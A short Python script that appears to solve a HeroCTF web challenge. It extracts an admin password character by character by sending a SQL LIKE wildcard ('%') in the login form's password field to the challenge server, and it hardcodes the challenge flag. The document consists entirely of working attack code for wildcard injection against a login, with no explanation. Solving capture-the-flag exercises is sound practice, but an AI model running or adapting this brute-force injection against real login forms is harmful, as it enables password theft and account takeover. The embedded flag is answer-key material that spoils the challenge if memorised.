import requests
import string

with requests.Session() as session:
    r = session.get("http://chall1.heroctf.fr:8080/index.php")
    chars = string.printable
    chars = chars.replace('%','')
    password = ""
    while True:
        for c in chars :
            data = {'username':'admin', 'password': password + c + "%"}
            r = session.post("http://chall1.heroctf.fr:8080/index.php",data=data)
            if "Hero{pwnQL_b4sic_0ne_129835}" in r.text :
                break
        if c == chars[-1]:
            break
        password += c
        print(password)